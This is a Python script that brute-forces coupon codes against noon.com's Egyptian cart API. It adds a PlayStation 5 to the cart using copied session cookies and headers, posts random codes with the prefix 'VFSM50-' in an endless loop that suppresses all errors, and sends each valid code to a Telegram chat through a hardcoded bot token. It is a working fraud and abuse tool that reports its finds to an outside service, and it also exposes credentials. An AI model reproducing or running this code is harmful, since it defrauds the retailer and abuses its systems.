import requests
import telebot
####bot spam ###
tok = "8128789997:AAHIE70sQCwEZYPt7p90uLLg5RUHrIYnyxU"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
s = requests.Session()
import uuid
import random
import string
def generate_code(prefix, length):
    # الجزء العشوائي من الكود
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    # دمج الجزء الثابت مع الجزء العشوائي
    code = prefix + random_part
    return code

# مثال للاستخدام
prefix = "VFSM50-"
T="OP100"
def Test():
    random_uuid = uuid.uuid4()
    random_uuid_str = str(uuid.uuid4())
    z = generate_code(prefix, 8)
   # z=T
    cookies = {
        'nloc': 'en-eg',
        'visitor_id': random_uuid_str,
        'x-available-eg': 'ecom',
        '_gcl_au': '1.1.1791298453.1709821654',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22qhN0iAldZiPxBOQkYXpV%22%7D',
        '__rtbh.uid': '%7B%22eventType%22%3A%22uid%22%2C%22id%22%3Anull%7D',
        '_ga': 'GA1.2.528791150.1709821666',
        '_gid': 'GA1.2.1826113793.1709821666',
        '_scid': '6a94b25f-691d-48e8-8e9b-ea8557eaace0',
        'bm_mi': 'D609C5BBA0FDC26C3FE994464092C941~YAAQRH4ZuGQZOumNAQAAh5lQGRfQ8PIof1j4dQFVCCLF8eAz7AlVX4slLEiLMacu8QfsgXH3zALHYDu8yqdPbs1nzs2BopIVQtyWrDz03D6sLt/GSjEkttoTmlerA4Nnb8eMhahq+JQ7kOO+zc/p1dl6j2mY/VffNey0RCH/7ROojmbnGHc7ti+J9O9xV5MY2FCgzXrSxoaD7FP/hupJzo2jVLAHzulxanSCuc8Qeea2vjM6A6Iz1gphOD3tMA+mTWZR1yM4fJ9+CxT1ZGuCeSdhLA30ZrsacIeV+D3OQrzKLa/VFhTTffPlMCsgJsR/mdKF1TmPXXqg1wy/CPchjhobLAhelHKsKfJeHz8MXPtV5FQezwp1ny5cMum0bAn2ERUd+JXEI5mhuHiv913LALb+gxjFi2sv82GHmQSuOvZU/d/Ka1aVtJ7Zf1TYpQP0N8r4R8BdMG6dT46LO/rqdEeXj7EK12qdMaGUFuzlC4xRc/aBHKCsNvXegK/O7I85u1Fr06vRt6AwCnXtoz4JHmCoKwgZu+AYnokUILHkJIXr~1',
        'ak_bmsc': '101C9A7F0A12D3141BECC6FE1972CC63~000000000000000000000000000000~YAAQRH4ZuBoeOumNAQAAgb1QGRfwMoi1nur7oz9bJJVyi1SPteeFKgwosL99vuoo+N12Bo19VVzhGCAWXrrlVWHvxoaHM2Bp9Oh7iQSE5kVF6FTLcsSFkE1sCzhV8M9PF2DgE0SnaRZqXZf4sM3SiR1fS+fjeX0pTdIIcxfaZh0/YrHl7N9AUf2bf7GPqzo1hgxhLm9bvYvva8Bt55lrLc+gMxcV4mFT9WNFDDg+uwAP4mbILU6jvIQNmiyavBSXf0tDO6etQyyCLOrkE/VS97iRHyb7xwqvsX1Ol4ClbScf7lDb7itoz6T7Ba4AITOEWLwHxKkDr+CFKn3PlXcV0vaZoQzL1z4JxFizqzhTcxChQuVRAIBpvvhpr4iqmB8ll3a2MydoNhmz5tcoSFPpNxItXA50XyA8oeVdfKy2wXoesKMmFyVheoUifCsY2xIDITl75j7EigsucbAqIm+Z3Sq0tAS/dhjQRwWFaeg2/uev65C9qIjOFMbkPnPd19kv1X4vtzHVnjK7WQXVrlK4AVLzv3w5zWRG0PsvsOKpvtnP0Lsra0HKhb/64O/MUIGReDo+xnAw/w5oLd8DMUaXLjT0CfGLh2XmFdpbinGuUG8YIHJHlhPfqCIHPC74GvAoEUgScAdm64TeyE7auelDP0nTpRL0G5DrA5dzYexKvOWDfeYJWo2QbmXbCrEbookG7EqGba6Qw0VdmvBfntKGOME=',
        '_fbp': 'fb.1.1709821692262.1996588333',
        '_tt_enable_cookie': '1',
        '_ttp': 'FFUWcKWtIsehzu6TJ9h7eMTu4cg',
        '_sctr': '1%7C1709762400000',
        '_clck': '1lb7j9c%7C2%7Cfjv%7C0%7C1527',
        '__zlcmid': '1KfmYEh9Ld6bMLU',
        'AKA_A2': 'A',
        'nguestv2': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiIzOGI2YWYxOTQ2MTI0NGMyYTM1MWZiMTFkNzU4NDdkZCIsImlhdCI6MTcwOTgyNzMzMywiZXhwIjoxNzA5ODI3NjMzfQ.wVSkCslw95QI3a37NkVv3aF4UO-vt57N2inuTZlpins',
        'nguestv2': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiI2ZGM0N2ZmZWQ3MDI0MjlkYjliM2M1NzgyM2Q2MDg3YyIsImlhdCI6MTcwOTgyNzMzNSwiZXhwIjoxNzA5ODI3NjM1fQ.XrsD6mu_AiyRBqtO-ZpBSDJ5oUewHMmPj20wMfSxaWk',
        '_etc': 'VkqVm9jursDJ8V38',
        '_scid_r': '6a94b25f-691d-48e8-8e9b-ea8557eaace0',
        'RT': '"z=1&dm=noon.com&si=fkh8v3ys3cl&ss=lthei0wg&sl=2&tt=95l&rl=1&ld=js4d"',
        '_gat_UA-84507530-14': '1',
        '_clsk': 'zk25hr%7C1709827581306%7C25%7C0%7Cp.clarity.ms%2Fcollect',
        '__gads': 'ID=fddb444495832a57:T=1709821707:RT=1709827580:S=ALNI_MbIIZY1skSCDBOn97gDT1cvUPIcxQ',
        '__gpi': 'UID=00000d6b7b41920d:T=1709821707:RT=1709827580:S=ALNI_MYgG1Z4WBE581Qc27ShRZrw-asdvg',
        '__eoi': 'ID=8647f55ce2cc9571:T=1709821707:RT=1709827580:S=AA-AfjZb4nqDfyRr54prBKBRPJ_7',
        '_uetsid': 'de0ae0e0dc8e11ee8195afd954ff319c',
        '_uetvid': 'de0b83e0dc8e11ee807ee1facb9d43ee',
        'bm_sv': 'A293566F04F91AE86A330D638B1E43D0~YAAQHn4ZuGfY8hOOAQAAamaqGRegekyAB+nzzFIs5/PD0yYmfe+peKKwVv/0xvnwWvOLyBRc7yEjfoJUT9R9CfKPDdki623UjuCEcWCmPGRsI8wooUTXiktT/IkEH8gdTDMM8W2ncWI67rrfQ5Nji2BoSHPx57CZv1psnfA18nU+v8+DbAgcSm/MFARyo8eVCUge/USSqvs/+6i/lrRNB3+JYIojTMIjY+UjFi1iFLDV38X3oHvpuKnlBRO5hLIx~1',
    }

    headers = {
        'authority': 'www.noon.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache, max-age=0, must-revalidate, no-store',
        'content-type': 'application/json',
        # 'cookie': 'nloc=en-eg; visitor_id=ad87c0f9-6094-4716-87d3-b2da40de8632; x-available-eg=ecom; _gcl_au=1.1.1791298453.1709821654; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22qhN0iAldZiPxBOQkYXpV%22%7D; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3Anull%7D; _ga=GA1.2.528791150.1709821666; _gid=GA1.2.1826113793.1709821666; _scid=6a94b25f-691d-48e8-8e9b-ea8557eaace0; bm_mi=D609C5BBA0FDC26C3FE994464092C941~YAAQRH4ZuGQZOumNAQAAh5lQGRfQ8PIof1j4dQFVCCLF8eAz7AlVX4slLEiLMacu8QfsgXH3zALHYDu8yqdPbs1nzs2BopIVQtyWrDz03D6sLt/GSjEkttoTmlerA4Nnb8eMhahq+JQ7kOO+zc/p1dl6j2mY/VffNey0RCH/7ROojmbnGHc7ti+J9O9xV5MY2FCgzXrSxoaD7FP/hupJzo2jVLAHzulxanSCuc8Qeea2vjM6A6Iz1gphOD3tMA+mTWZR1yM4fJ9+CxT1ZGuCeSdhLA30ZrsacIeV+D3OQrzKLa/VFhTTffPlMCsgJsR/mdKF1TmPXXqg1wy/CPchjhobLAhelHKsKfJeHz8MXPtV5FQezwp1ny5cMum0bAn2ERUd+JXEI5mhuHiv913LALb+gxjFi2sv82GHmQSuOvZU/d/Ka1aVtJ7Zf1TYpQP0N8r4R8BdMG6dT46LO/rqdEeXj7EK12qdMaGUFuzlC4xRc/aBHKCsNvXegK/O7I85u1Fr06vRt6AwCnXtoz4JHmCoKwgZu+AYnokUILHkJIXr~1; ak_bmsc=101C9A7F0A12D3141BECC6FE1972CC63~000000000000000000000000000000~YAAQRH4ZuBoeOumNAQAAgb1QGRfwMoi1nur7oz9bJJVyi1SPteeFKgwosL99vuoo+N12Bo19VVzhGCAWXrrlVWHvxoaHM2Bp9Oh7iQSE5kVF6FTLcsSFkE1sCzhV8M9PF2DgE0SnaRZqXZf4sM3SiR1fS+fjeX0pTdIIcxfaZh0/YrHl7N9AUf2bf7GPqzo1hgxhLm9bvYvva8Bt55lrLc+gMxcV4mFT9WNFDDg+uwAP4mbILU6jvIQNmiyavBSXf0tDO6etQyyCLOrkE/VS97iRHyb7xwqvsX1Ol4ClbScf7lDb7itoz6T7Ba4AITOEWLwHxKkDr+CFKn3PlXcV0vaZoQzL1z4JxFizqzhTcxChQuVRAIBpvvhpr4iqmB8ll3a2MydoNhmz5tcoSFPpNxItXA50XyA8oeVdfKy2wXoesKMmFyVheoUifCsY2xIDITl75j7EigsucbAqIm+Z3Sq0tAS/dhjQRwWFaeg2/uev65C9qIjOFMbkPnPd19kv1X4vtzHVnjK7WQXVrlK4AVLzv3w5zWRG0PsvsOKpvtnP0Lsra0HKhb/64O/MUIGReDo+xnAw/w5oLd8DMUaXLjT0CfGLh2XmFdpbinGuUG8YIHJHlhPfqCIHPC74GvAoEUgScAdm64TeyE7auelDP0nTpRL0G5DrA5dzYexKvOWDfeYJWo2QbmXbCrEbookG7EqGba6Qw0VdmvBfntKGOME=; _fbp=fb.1.1709821692262.1996588333; _tt_enable_cookie=1; _ttp=FFUWcKWtIsehzu6TJ9h7eMTu4cg; _sctr=1%7C1709762400000; _clck=1lb7j9c%7C2%7Cfjv%7C0%7C1527; __zlcmid=1KfmYEh9Ld6bMLU; AKA_A2=A; nguestv2=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiIzOGI2YWYxOTQ2MTI0NGMyYTM1MWZiMTFkNzU4NDdkZCIsImlhdCI6MTcwOTgyNzMzMywiZXhwIjoxNzA5ODI3NjMzfQ.wVSkCslw95QI3a37NkVv3aF4UO-vt57N2inuTZlpins; nguestv2=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiI2ZGM0N2ZmZWQ3MDI0MjlkYjliM2M1NzgyM2Q2MDg3YyIsImlhdCI6MTcwOTgyNzMzNSwiZXhwIjoxNzA5ODI3NjM1fQ.XrsD6mu_AiyRBqtO-ZpBSDJ5oUewHMmPj20wMfSxaWk; _etc=VkqVm9jursDJ8V38; _scid_r=6a94b25f-691d-48e8-8e9b-ea8557eaace0; RT="z=1&dm=noon.com&si=fkh8v3ys3cl&ss=lthei0wg&sl=2&tt=95l&rl=1&ld=js4d"; _gat_UA-84507530-14=1; _clsk=zk25hr%7C1709827581306%7C25%7C0%7Cp.clarity.ms%2Fcollect; __gads=ID=fddb444495832a57:T=1709821707:RT=1709827580:S=ALNI_MbIIZY1skSCDBOn97gDT1cvUPIcxQ; __gpi=UID=00000d6b7b41920d:T=1709821707:RT=1709827580:S=ALNI_MYgG1Z4WBE581Qc27ShRZrw-asdvg; __eoi=ID=8647f55ce2cc9571:T=1709821707:RT=1709827580:S=AA-AfjZb4nqDfyRr54prBKBRPJ_7; _uetsid=de0ae0e0dc8e11ee8195afd954ff319c; _uetvid=de0b83e0dc8e11ee807ee1facb9d43ee; bm_sv=A293566F04F91AE86A330D638B1E43D0~YAAQHn4ZuGfY8hOOAQAAamaqGRegekyAB+nzzFIs5/PD0yYmfe+peKKwVv/0xvnwWvOLyBRc7yEjfoJUT9R9CfKPDdki623UjuCEcWCmPGRsI8wooUTXiktT/IkEH8gdTDMM8W2ncWI67rrfQ5Nji2BoSHPx57CZv1psnfA18nU+v8+DbAgcSm/MFARyo8eVCUge/USSqvs/+6i/lrRNB3+JYIojTMIjY+UjFi1iFLDV38X3oHvpuKnlBRO5hLIx~1',
        'origin': 'https://www.noon.com',
        'referer': 'https://www.noon.com/egypt-en/playstation-5-console-disc-version-with-controller/N40633047A/p/?o=fcb86993a7e25ded',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'x-aby': '{"ipl_entrypoint_v2.enabled":1,"ipl_v2.enabled":1,"mid_roll_filters.enabled":1,"noon_pass.enabled":0,"otp_login.enabled":1,"pdp_bos.enabled":1,"pdp_flyout.flyout_value":0,"tag_nudge.enabled":1}',
        'x-cms': 'v2',
        'x-content': 'desktop',
        'x-lat': '30.0631437',
        'x-lng': '31.2205224',
        'x-locale': 'en-eg',
        'x-mp': 'noon',
        'x-platform': 'web',
        'x-visitor-id': random_uuid_str,
    }

    json_data = {
        'offerId': 'fcb86993a7e25ded',
        'quantity': 1,
        'attachments': [],
        'isFouponSelected': False,
        'storeCode': '',
    }

    response = s.post(
        'https://www.noon.com/_svc/cart-v1/cart/item/fcb86993a7e25ded/1?showCart',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )


    cookies1 = {
        'nloc': 'en-eg',
        'visitor_id': random_uuid_str,
        'x-available-eg': 'ecom',
        '_gcl_au': '1.1.1791298453.1709821654',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22qhN0iAldZiPxBOQkYXpV%22%7D',
        '__rtbh.uid': '%7B%22eventType%22%3A%22uid%22%2C%22id%22%3Anull%7D',
        '_ga': 'GA1.2.528791150.1709821666',
        '_gid': 'GA1.2.1826113793.1709821666',
        '_scid': '6a94b25f-691d-48e8-8e9b-ea8557eaace0',
        'bm_mi': 'D609C5BBA0FDC26C3FE994464092C941~YAAQRH4ZuGQZOumNAQAAh5lQGRfQ8PIof1j4dQFVCCLF8eAz7AlVX4slLEiLMacu8QfsgXH3zALHYDu8yqdPbs1nzs2BopIVQtyWrDz03D6sLt/GSjEkttoTmlerA4Nnb8eMhahq+JQ7kOO+zc/p1dl6j2mY/VffNey0RCH/7ROojmbnGHc7ti+J9O9xV5MY2FCgzXrSxoaD7FP/hupJzo2jVLAHzulxanSCuc8Qeea2vjM6A6Iz1gphOD3tMA+mTWZR1yM4fJ9+CxT1ZGuCeSdhLA30ZrsacIeV+D3OQrzKLa/VFhTTffPlMCsgJsR/mdKF1TmPXXqg1wy/CPchjhobLAhelHKsKfJeHz8MXPtV5FQezwp1ny5cMum0bAn2ERUd+JXEI5mhuHiv913LALb+gxjFi2sv82GHmQSuOvZU/d/Ka1aVtJ7Zf1TYpQP0N8r4R8BdMG6dT46LO/rqdEeXj7EK12qdMaGUFuzlC4xRc/aBHKCsNvXegK/O7I85u1Fr06vRt6AwCnXtoz4JHmCoKwgZu+AYnokUILHkJIXr~1',
        'ak_bmsc': '101C9A7F0A12D3141BECC6FE1972CC63~000000000000000000000000000000~YAAQRH4ZuBoeOumNAQAAgb1QGRfwMoi1nur7oz9bJJVyi1SPteeFKgwosL99vuoo+N12Bo19VVzhGCAWXrrlVWHvxoaHM2Bp9Oh7iQSE5kVF6FTLcsSFkE1sCzhV8M9PF2DgE0SnaRZqXZf4sM3SiR1fS+fjeX0pTdIIcxfaZh0/YrHl7N9AUf2bf7GPqzo1hgxhLm9bvYvva8Bt55lrLc+gMxcV4mFT9WNFDDg+uwAP4mbILU6jvIQNmiyavBSXf0tDO6etQyyCLOrkE/VS97iRHyb7xwqvsX1Ol4ClbScf7lDb7itoz6T7Ba4AITOEWLwHxKkDr+CFKn3PlXcV0vaZoQzL1z4JxFizqzhTcxChQuVRAIBpvvhpr4iqmB8ll3a2MydoNhmz5tcoSFPpNxItXA50XyA8oeVdfKy2wXoesKMmFyVheoUifCsY2xIDITl75j7EigsucbAqIm+Z3Sq0tAS/dhjQRwWFaeg2/uev65C9qIjOFMbkPnPd19kv1X4vtzHVnjK7WQXVrlK4AVLzv3w5zWRG0PsvsOKpvtnP0Lsra0HKhb/64O/MUIGReDo+xnAw/w5oLd8DMUaXLjT0CfGLh2XmFdpbinGuUG8YIHJHlhPfqCIHPC74GvAoEUgScAdm64TeyE7auelDP0nTpRL0G5DrA5dzYexKvOWDfeYJWo2QbmXbCrEbookG7EqGba6Qw0VdmvBfntKGOME=',
        '_fbp': 'fb.1.1709821692262.1996588333',
        '_tt_enable_cookie': '1',
        '_ttp': 'FFUWcKWtIsehzu6TJ9h7eMTu4cg',
        '_sctr': '1%7C1709762400000',
        '_clck': '1lb7j9c%7C2%7Cfjv%7C0%7C1527',
        '__zlcmid': '1KfmYEh9Ld6bMLU',
        'AKA_A2': 'A',
        'nguestv2': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiIzOGI2YWYxOTQ2MTI0NGMyYTM1MWZiMTFkNzU4NDdkZCIsImlhdCI6MTcwOTgyNzMzMywiZXhwIjoxNzA5ODI3NjMzfQ.wVSkCslw95QI3a37NkVv3aF4UO-vt57N2inuTZlpins',
        'nguestv2': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiI2ZGM0N2ZmZWQ3MDI0MjlkYjliM2M1NzgyM2Q2MDg3YyIsImlhdCI6MTcwOTgyNzMzNSwiZXhwIjoxNzA5ODI3NjM1fQ.XrsD6mu_AiyRBqtO-ZpBSDJ5oUewHMmPj20wMfSxaWk',
        '_etc': 'VkqVm9jursDJ8V38',
        '_scid_r': '6a94b25f-691d-48e8-8e9b-ea8557eaace0',
        'RT': '"z=1&dm=noon.com&si=fkh8v3ys3cl&ss=lthei0wg&sl=2&tt=95l&rl=1&ld=js4d"',
        '_gat_UA-84507530-14': '1',
        '__gads': 'ID=fddb444495832a57:T=1709821707:RT=1709827580:S=ALNI_MbIIZY1skSCDBOn97gDT1cvUPIcxQ',
        '__gpi': 'UID=00000d6b7b41920d:T=1709821707:RT=1709827580:S=ALNI_MYgG1Z4WBE581Qc27ShRZrw-asdvg',
        '__eoi': 'ID=8647f55ce2cc9571:T=1709821707:RT=1709827580:S=AA-AfjZb4nqDfyRr54prBKBRPJ_7',
        '_uetsid': 'de0ae0e0dc8e11ee8195afd954ff319c',
        '_uetvid': 'de0b83e0dc8e11ee807ee1facb9d43ee',
        '_clsk': 'zk25hr%7C1709827588471%7C26%7C0%7Cp.clarity.ms%2Fcollect',
        'bm_sv': 'A293566F04F91AE86A330D638B1E43D0~YAAQHn4ZuKHY8hOOAQAAMYGqGRezegpMdZMe1yGwQTuscHkBYjZuAdAIOHrcSFzlBN7+2h8lWbzHJLVpDU3tnOK0hez9x5TDM43LC+eoiGTeRhAig8w9J761p4ZDaK0jnhPgp4DQLCZWa3eV2f19F4jKlZUaS5gu9mB/KxhMeqeCbHOSCpPnPlNa51Z03X6Ks+RLBqbKnXnQCmIZKoQNNsK1UncIFV815E82tkdULLq9TvrXZLV5wBs5ti8+eQeE~1',
    }

    headers1 = {
        'authority': 'www.noon.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache, max-age=0, must-revalidate, no-store',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        # 'cookie': 'nloc=en-eg; visitor_id=ad87c0f9-6094-4716-87d3-b2da40de8632; x-available-eg=ecom; _gcl_au=1.1.1791298453.1709821654; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22qhN0iAldZiPxBOQkYXpV%22%7D; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3Anull%7D; _ga=GA1.2.528791150.1709821666; _gid=GA1.2.1826113793.1709821666; _scid=6a94b25f-691d-48e8-8e9b-ea8557eaace0; bm_mi=D609C5BBA0FDC26C3FE994464092C941~YAAQRH4ZuGQZOumNAQAAh5lQGRfQ8PIof1j4dQFVCCLF8eAz7AlVX4slLEiLMacu8QfsgXH3zALHYDu8yqdPbs1nzs2BopIVQtyWrDz03D6sLt/GSjEkttoTmlerA4Nnb8eMhahq+JQ7kOO+zc/p1dl6j2mY/VffNey0RCH/7ROojmbnGHc7ti+J9O9xV5MY2FCgzXrSxoaD7FP/hupJzo2jVLAHzulxanSCuc8Qeea2vjM6A6Iz1gphOD3tMA+mTWZR1yM4fJ9+CxT1ZGuCeSdhLA30ZrsacIeV+D3OQrzKLa/VFhTTffPlMCsgJsR/mdKF1TmPXXqg1wy/CPchjhobLAhelHKsKfJeHz8MXPtV5FQezwp1ny5cMum0bAn2ERUd+JXEI5mhuHiv913LALb+gxjFi2sv82GHmQSuOvZU/d/Ka1aVtJ7Zf1TYpQP0N8r4R8BdMG6dT46LO/rqdEeXj7EK12qdMaGUFuzlC4xRc/aBHKCsNvXegK/O7I85u1Fr06vRt6AwCnXtoz4JHmCoKwgZu+AYnokUILHkJIXr~1; ak_bmsc=101C9A7F0A12D3141BECC6FE1972CC63~000000000000000000000000000000~YAAQRH4ZuBoeOumNAQAAgb1QGRfwMoi1nur7oz9bJJVyi1SPteeFKgwosL99vuoo+N12Bo19VVzhGCAWXrrlVWHvxoaHM2Bp9Oh7iQSE5kVF6FTLcsSFkE1sCzhV8M9PF2DgE0SnaRZqXZf4sM3SiR1fS+fjeX0pTdIIcxfaZh0/YrHl7N9AUf2bf7GPqzo1hgxhLm9bvYvva8Bt55lrLc+gMxcV4mFT9WNFDDg+uwAP4mbILU6jvIQNmiyavBSXf0tDO6etQyyCLOrkE/VS97iRHyb7xwqvsX1Ol4ClbScf7lDb7itoz6T7Ba4AITOEWLwHxKkDr+CFKn3PlXcV0vaZoQzL1z4JxFizqzhTcxChQuVRAIBpvvhpr4iqmB8ll3a2MydoNhmz5tcoSFPpNxItXA50XyA8oeVdfKy2wXoesKMmFyVheoUifCsY2xIDITl75j7EigsucbAqIm+Z3Sq0tAS/dhjQRwWFaeg2/uev65C9qIjOFMbkPnPd19kv1X4vtzHVnjK7WQXVrlK4AVLzv3w5zWRG0PsvsOKpvtnP0Lsra0HKhb/64O/MUIGReDo+xnAw/w5oLd8DMUaXLjT0CfGLh2XmFdpbinGuUG8YIHJHlhPfqCIHPC74GvAoEUgScAdm64TeyE7auelDP0nTpRL0G5DrA5dzYexKvOWDfeYJWo2QbmXbCrEbookG7EqGba6Qw0VdmvBfntKGOME=; _fbp=fb.1.1709821692262.1996588333; _tt_enable_cookie=1; _ttp=FFUWcKWtIsehzu6TJ9h7eMTu4cg; _sctr=1%7C1709762400000; _clck=1lb7j9c%7C2%7Cfjv%7C0%7C1527; __zlcmid=1KfmYEh9Ld6bMLU; AKA_A2=A; nguestv2=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiIzOGI2YWYxOTQ2MTI0NGMyYTM1MWZiMTFkNzU4NDdkZCIsImlhdCI6MTcwOTgyNzMzMywiZXhwIjoxNzA5ODI3NjMzfQ.wVSkCslw95QI3a37NkVv3aF4UO-vt57N2inuTZlpins; nguestv2=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiI2ZGM0N2ZmZWQ3MDI0MjlkYjliM2M1NzgyM2Q2MDg3YyIsImlhdCI6MTcwOTgyNzMzNSwiZXhwIjoxNzA5ODI3NjM1fQ.XrsD6mu_AiyRBqtO-ZpBSDJ5oUewHMmPj20wMfSxaWk; _etc=VkqVm9jursDJ8V38; _scid_r=6a94b25f-691d-48e8-8e9b-ea8557eaace0; RT="z=1&dm=noon.com&si=fkh8v3ys3cl&ss=lthei0wg&sl=2&tt=95l&rl=1&ld=js4d"; _gat_UA-84507530-14=1; __gads=ID=fddb444495832a57:T=1709821707:RT=1709827580:S=ALNI_MbIIZY1skSCDBOn97gDT1cvUPIcxQ; __gpi=UID=00000d6b7b41920d:T=1709821707:RT=1709827580:S=ALNI_MYgG1Z4WBE581Qc27ShRZrw-asdvg; __eoi=ID=8647f55ce2cc9571:T=1709821707:RT=1709827580:S=AA-AfjZb4nqDfyRr54prBKBRPJ_7; _uetsid=de0ae0e0dc8e11ee8195afd954ff319c; _uetvid=de0b83e0dc8e11ee807ee1facb9d43ee; _clsk=zk25hr%7C1709827588471%7C26%7C0%7Cp.clarity.ms%2Fcollect; bm_sv=A293566F04F91AE86A330D638B1E43D0~YAAQHn4ZuKHY8hOOAQAAMYGqGRezegpMdZMe1yGwQTuscHkBYjZuAdAIOHrcSFzlBN7+2h8lWbzHJLVpDU3tnOK0hez9x5TDM43LC+eoiGTeRhAig8w9J761p4ZDaK0jnhPgp4DQLCZWa3eV2f19F4jKlZUaS5gu9mB/KxhMeqeCbHOSCpPnPlNa51Z03X6Ks+RLBqbKnXnQCmIZKoQNNsK1UncIFV815E82tkdULLq9TvrXZLV5wBs5ti8+eQeE~1',
        'origin': 'https://www.noon.com',
        'referer': 'https://www.noon.com/egypt-en/cart/',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'x-aby': '{"ipl_entrypoint_v2.enabled":1,"ipl_v2.enabled":1,"mid_roll_filters.enabled":1,"noon_pass.enabled":0,"otp_login.enabled":1,"pdp_bos.enabled":1,"pdp_flyout.flyout_value":0,"tag_nudge.enabled":1}',
        'x-cms': 'v2',
        'x-content': 'desktop',
        'x-lat': '30.0631437',
        'x-lng': '31.2205224',
        'x-locale': 'en-eg',
        'x-mp': 'noon',
        'x-platform': 'web',
        'x-visitor-id': random_uuid_str,
    }

    json_data1 = {}
    url2=f'https://www.noon.com/_svc/cart-v1/coupon?code={z}&showCart'
    print(url2)
    response1 = s.post(
        url2,
        cookies=cookies1,
        headers=headers1,
        json=json_data1,
    ).text
    #print(response1)
    if "Hurray! You got a discount!" in response1:
        print('Hurray! You got a discount!')
        botA.send_message(chat_id=ch_id, text=z)
    elif 'Coupon is only valid' in response1:
        print('Coupon is not allow your country')
    elif 'Oops! Coupon code invalid' in response1:
        print('Oops! Coupon Error')
while True:
    try:
        Test()
    except:
    	pass
